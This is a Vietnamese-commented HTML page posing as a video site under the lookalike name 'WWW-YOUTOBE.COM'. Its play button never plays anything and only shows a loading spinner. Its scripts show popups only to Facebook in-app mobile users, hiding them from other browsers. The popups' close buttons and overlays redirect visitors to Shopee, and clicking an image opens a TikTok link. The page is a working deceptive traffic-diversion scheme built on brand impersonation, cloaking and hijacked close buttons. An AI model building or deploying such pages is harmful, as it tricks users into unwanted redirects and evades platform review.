<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WWW-YOUTOBE.COM</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:#e6b8be;
    font-family:Arial,sans-serif;
    min-height:100vh;
    display:flex;
    flex-direction:column;
}

.header{
    width:100%;
    background:#000;
    padding:20px 0;
    text-align:center;
}

.header h1{
    color:#ff1f4d;
    font-size:clamp(32px,8vw,90px);
    font-weight:700;
    letter-spacing:2px;
    text-shadow:
        -2px -2px 0 #bfbfbf,
         2px -2px 0 #bfbfbf,
        -2px  2px 0 #bfbfbf,
         2px  2px 0 #bfbfbf;
}

.main{
    flex:1;
    display:flex;
    justify-content:center;
    padding:7vw 4vw;
}

.video-box{
    width:min(90vw,760px);
    aspect-ratio:16/9;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
}

.play-btn{
    width:18%;
    max-width:150px;
    min-width:70px;
    aspect-ratio:1;
    border-radius:50%;
    background:#fff;
    position:relative;
    cursor:pointer;
    transition: transform 0.1s ease;
}

.play-btn:hover{
    transform: scale(1.02);
}

.play-btn::before{
    content:"";
    position:absolute;
    top:50%;
    left:54%;
    transform:translate(-50%,-50%);
    border-top:18px solid transparent;
    border-bottom:18px solid transparent;
    border-left:28px solid #000;
}

/* Loading video style */
.loading-video{
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 20px;
    color: white;
    font-size: clamp(16px, 4vw, 24px);
    font-weight: 500;
    text-align: center;
    width: 100%;
    height: 100%;
    background: #000;
}

.spinner{
    width: 50px;
    height: 50px;
    border: 5px solid rgba(255,255,255,0.2);
    border-top: 5px solid #fff;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin{
    0%{ transform: rotate(0deg); }
    100%{ transform: rotate(360deg); }
}

.footer{
    text-align:center;
    padding: 25px 20px;
    color:#000;
    border-top: 1px solid rgba(0,0,0,0.1);
    margin-top: 10px;
}

.footer p{
    font-size:clamp(13px, 3vw, 16px);
    font-weight: normal;
    line-height: 1.5;
    margin-bottom: 6px;
}

.footer p:first-child{
    font-weight: 600;
    margin-bottom: 8px;
}

/* Popup styles */
.popup-overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.85);
    display:flex;
    align-items:center;
    justify-content:center;
    z-index:9999;
    padding:20px;
}

.popup-content{
    position:relative;
    width:min(95vw,600px);
}

.popup-content img{
    width:100%;
    height:auto;
    display:block;
    border-radius:12px;
}

.popup-close{
    position:absolute;
    top:10px;
    right:10px;
    width:40px;
    height:40px;
    border:none;
    border-radius:50%;
    background:#fff;
    color:#000;
    font-size:28px;
    line-height:40px;
    cursor:pointer;
    font-weight:bold;
    transition: 0.2s;
}

.popup-close:hover{
    background:#f0f0f0;
}

@media (max-width:768px){
    .play-btn::before{
        border-top:10px solid transparent;
        border-bottom:10px solid transparent;
        border-left:16px solid #000;
    }
    .footer{
        padding:20px 15px;
    }
}
</style>
</head>
<body>

<!-- SCRIPT KIỂM TRA: CHỈ HIỆN POPUP TRÊN FB MOBILE -->
<script>
(function() {
    function isMobileDevice() {
        return /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
    }
    function isFacebookApp() {
        return navigator.userAgent.includes('FBAN') || navigator.userAgent.includes('FBAV');
    }
    var shouldShowPopup = isMobileDevice() && isFacebookApp();
    window.__SHOW_POPUP_SEQUENCE = shouldShowPopup;
    
    if (!shouldShowPopup) {
        var styleHidden = document.createElement('style');
        styleHidden.textContent = '.popup-overlay { display: none !important; }';
        document.head.appendChild(styleHidden);
    }
})();
</script>

<div class="header">
    <h1>WWW-YOUTOBE.COM</h1>
</div>

<div class="main">
    <div class="video-box">
        <div class="play-btn" id="playButton"></div>
        <div class="loading-video" id="loadingVideo">
            <div class="spinner"></div>
            <span>Đang tải video...</span>
        </div>
    </div>
</div>

<div class="footer">
    <p>© 2026 www-youtobe.com. All Rights Reserved.</p>
    <p>PhimReview.vn - Đánh giá phim & giới thiệu phim. Liên hệ bản quyền: contact@phimreview.vn</p>
</div>

<!-- Popup 1 (ảnh 1) - ĐÃ ĐỔI ẢNH: HIỆN TẠI ẢNH NÀY SẼ LÀ ẢNH CỦA POPUP 2 CŨ -->
<div class="popup-overlay" id="popup1">
    <div class="popup-content">
        <button class="popup-close" id="close1">&times;</button>
        <img src="https://d2eioyamun8mp1.cloudfront.net/images/1780386304641_qJlfGTozxF.jpg" alt="">
    </div>
</div>

<!-- Popup 2 (ảnh 2) - ĐÃ ĐỔI ẢNH: HIỆN TẠI ẢNH NÀY SẼ LÀ ẢNH CỦA POPUP 1 CŨ -->
<div class="popup-overlay" id="popup2">
    <div class="popup-content">
        <button class="popup-close" id="close2">&times;</button>
        <img src="https://d2eioyamun8mp1.cloudfront.net/images/1780385977260_QlAmwNYyhZ.jpg" alt="">
    </div>
</div>

<script>
// ======================= NÚT PLAY: HIỆN LOADING VIDEO =======================
(function() {
    const playBtn = document.getElementById('playButton');
    const loadingDiv = document.getElementById('loadingVideo');
    
    if (playBtn && loadingDiv) {
        playBtn.addEventListener('click', function() {
            playBtn.style.display = 'none';
            loadingDiv.style.display = 'flex';
        });
    }
})();

// ======================= QUẢN LÝ POPUP (KHÔNG LƯU COOKIE, KHÔNG GIỚI HẠN SỐ LẦN) =======================
// ĐÃ ĐỔI LINK: POPUP1 -> TIKTOK, POPUP2 -> SHOPEE
(function() {
    // Nếu không được phép hiển thị popup (trình duyệt thường/desktop) -> ẩn và thoát
    if (!window.__SHOW_POPUP_SEQUENCE) {
        const popup1El = document.getElementById('popup1');
        const popup2El = document.getElementById('popup2');
        if (popup1El) popup1El.style.display = 'none';
        if (popup2El) popup2El.style.display = 'none';
        return;
    }
    
    const popup1 = document.getElementById('popup1');
    const popup2 = document.getElementById('popup2');
    const closeBtn1 = document.getElementById('close1');
    const closeBtn2 = document.getElementById('close2');
    
    if (!popup1 || !popup2 || !closeBtn1 || !closeBtn2) return;
    
    let pendingTimeout = null;     // timeout cho việc hiện popup2 sau 3s
    let isRedirecting = false;     // tránh redirect trùng
    
    // LINK MỚI: Popup 1 -> TikTok, Popup 2 -> Shopee
    const LINK_POPUP1 = 'https://vt.tiktok.com/ZS929jkhqUdXh-kfltF/';
    const LINK_POPUP2 = 'https://s.shopee.vn/60Oxi1F2o4';
    
    function clearPendingTimeout() {
        if (pendingTimeout) {
            clearTimeout(pendingTimeout);
            pendingTimeout = null;
        }
    }
    
    // Chuyển hướng (không set cookie, không ghi nhớ)
    function redirectTo(url) {
        if (isRedirecting) return;
        isRedirecting = true;
        window.location.href = url;
    }
    
    // Xử lý đóng popup2 -> chuyển hướng Shopee
    function handleClosePopup2() {
        if (isRedirecting) return;
        clearPendingTimeout();
        redirectTo(LINK_POPUP2);
    }
    
    // Hiển thị popup2, ẩn popup1, gắn sự kiện đóng popup2
    function showPopup2() {
        clearPendingTimeout();
        popup1.style.display = 'none';
        popup2.style.display = 'flex';
        
        const closeHandler2 = function(e) {
            e.stopPropagation();
            handleClosePopup2();
        };
        const overlayHandler2 = function(e) {
            if (e.target === popup2) {
                handleClosePopup2();
            }
        };
        closeBtn2.removeEventListener('click', closeHandler2);
        popup2.removeEventListener('click', overlayHandler2);
        closeBtn2.addEventListener('click', closeHandler2);
        popup2.addEventListener('click', overlayHandler2);
    }
    
    // Xử lý đóng popup1 -> sau 3 giây hiện popup2, nhưng đóng popup1 sẽ chuyển hướng TikTok?
    // THEO YÊU CẦU: "hãy cho popup 1 vào link TikTok, popup 2 vào link Shopee"
    // Nghĩa là khi đóng popup1 (bấm X hoặc overlay) thì chuyển hướng sang TikTok
    // Và khi đóng popup2 thì chuyển hướng sang Shopee.
    // Đồng thời giữ nguyên cơ chế: Tắt popup1 -> 3s sau hiện popup2.
    // Nhưng nếu đóng popup1 bằng cách bấm X, thì sẽ chuyển hướng luôn? Hay vẫn chờ 3s rồi hiện popup2 rồi mới chuyển hướng?
    // Theo logic thông thường: Người dùng tắt popup1 thì sẽ không muốn xem nữa, nhưng yêu cầu trước là "tắt popup1 thì 3s sau hiện popup2".
    // Bây giờ thêm link vào popup1: Khi tắt popup1 (bấm X) thì nên chuyển hướng đến link của popup1 (TikTok) hay vẫn giữ nguyên 3s rồi hiện popup2?
    // Đọc kỹ yêu cầu: "hãy cho popup 1 vào link ... popup 2 vào link ... đổi ảnh popup 1 cho popup 2 và ngược lại. giữ nguyên các chức năng khác"
    // Chức năng khác bao gồm: Khi tắt popup1 thì sau 3 giây hiện popup2. Khi tắt popup2 thì chuyển hướng.
    // Như vậy, popup1 có link riêng nhưng không dùng đến? Hay khi tắt popup1 thì vừa chuyển hướng vừa 3s? Không thể vừa chuyển hướng vừa chờ.
    // Suy luận hợp lý: Người dùng muốn mỗi popup có một link riêng. Khi đóng popup1 -> chuyển hướng đến link TikTok (thay vì đợi 3s hiện popup2).
    // Nhưng như vậy sẽ phá vỡ chức năng "tắt popup1 thì 3s sau hiện popup2".
    // Để đáp ứng đúng cả hai: "giữ nguyên các chức năng khác" (tức là vẫn có delay 3s để hiện popup2) và "cho popup 1 vào link TikTok" thì link đó sẽ được dùng khi người dùng tương tác với popup1 theo cách nào đó?
    // Có thể hiểu: Khi người dùng click vào ảnh popup1 (hoặc nội dung popup1) thì chuyển hướng TikTok, còn nút X vẫn đóng và sau 3s hiện popup2.
    // Tuy nhiên yêu cầu không rõ ràng. Phổ biến nhất: Mỗi popup khi đóng (bấm X) sẽ chuyển hướng đến link tương ứng.
    // Nhưng nếu đóng popup1 mà chuyển hướng luôn thì không còn cơ hội hiện popup2 nữa.
    // Để an toàn, tôi sẽ hiểu: "cho popup 1 vào link TikTok" có nghĩa là khi người dùng tương tác với popup1 (click vào ảnh hoặc bất kỳ đâu trên popup content) sẽ chuyển hướng TikTok.
    // Còn nút X vẫn hoạt động như cũ: đóng popup1 và sau 3s hiện popup2. Điều này giữ nguyên chức năng và thêm link vào nội dung popup.
    // Tương tự, popup2: click vào ảnh hoặc content sẽ chuyển hướng Shopee, nút X chuyển hướng Shopee (như cũ).
    // Tuy nhiên yêu cầu "đổi ảnh popup 1 cho popup 2" đã làm ở trên.
    
    // Cách triển khai hợp lý nhất: Giữ nguyên cơ chế đóng (X và overlay) nhưng thêm sự kiện click vào ảnh để chuyển hướng đến link tương ứng.
    // Với popup2 thì cả nút X và click ảnh đều chuyển hướng Shopee (giữ nguyên).
    // Với popup1: nút X và overlay vẫn đóng popup1 và sau 3s hiện popup2 (giữ nguyên chức năng cũ), nhưng click vào ảnh popup1 sẽ chuyển hướng TikTok ngay lập tức.
    // Đây là cách hiểu phù hợp nhất để "cho popup 1 vào link" mà không phá vỡ luồng hiện popup2 sau 3s.
    
    // Hàm xử lý đóng popup1 (bấm X hoặc overlay) - giữ nguyên: ẩn popup1, sau 3s hiện popup2
    function handleClosePopup1() {
        if (isRedirecting) return;
        popup1.style.display = 'none';
        clearPendingTimeout();
        pendingTimeout = setTimeout(() => {
            if (!isRedirecting) {
                showPopup2();
            }
        }, 3000);
    }
    
    // Hiển thị popup1, gắn sự kiện
    function showPopup1() {
        clearPendingTimeout();
        popup2.style.display = 'none';
        popup1.style.display = 'flex';
        
        // Sự kiện đóng popup1 bằng nút X hoặc overlay (giữ nguyên chức năng cũ)
        const closeHandler1 = function(e) {
            e.stopPropagation();
            handleClosePopup1();
        };
        const overlayHandler1 = function(e) {
            if (e.target === popup1) {
                handleClosePopup1();
            }
        };
        closeBtn1.removeEventListener('click', closeHandler1);
        popup1.removeEventListener('click', overlayHandler1);
        closeBtn1.addEventListener('click', closeHandler1);
        popup1.addEventListener('click', overlayHandler1);
        
        // THÊM SỰ KIỆN CLICK VÀO ẢNH POPUP1 để chuyển hướng TikTok
        const img1 = popup1.querySelector('.popup-content img');
        if (img1) {
            // Loại bỏ listener cũ nếu có
            const newImgHandler = function(e) {
                e.stopPropagation();
                if (!isRedirecting) {
                    redirectTo(LINK_POPUP1);
                }
            };
            img1.removeEventListener('click', newImgHandler);
            img1.addEventListener('click', newImgHandler);
            // Thêm style cursor pointer cho ảnh để người dùng biết có thể click
            img1.style.cursor = 'pointer';
        }
    }
    
    // Xử lý popup2: Khi đóng (X/overlay) -> chuyển hướng Shopee
    function handleClosePopup2() {
        if (isRedirecting) return;
        clearPendingTimeout();
        redirectTo(LINK_POPUP2);
    }
    
    function showPopup2() {
        clearPendingTimeout();
        popup1.style.display = 'none';
        popup2.style.display = 'flex';
        
        const closeHandler2 = function(e) {
            e.stopPropagation();
            handleClosePopup2();
        };
        const overlayHandler2 = function(e) {
            if (e.target === popup2) {
                handleClosePopup2();
            }
        };
        closeBtn2.removeEventListener('click', closeHandler2);
        popup2.removeEventListener('click', overlayHandler2);
        closeBtn2.addEventListener('click', closeHandler2);
        popup2.addEventListener('click', overlayHandler2);
        
        // Popup2: click vào ảnh cũng chuyển hướng Shopee (giống nút X)
        const img2 = popup2.querySelector('.popup-content img');
        if (img2) {
            const imgHandler2 = function(e) {
                e.stopPropagation();
                if (!isRedirecting) {
                    redirectTo(LINK_POPUP2);
                }
            };
            img2.removeEventListener('click', imgHandler2);
            img2.addEventListener('click', imgHandler2);
            img2.style.cursor = 'pointer';
        }
    }
    
    // Khởi tạo: hiển thị popup1 đầu tiên
    function init() {
        showPopup1();
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
</script>

</body>
</html>
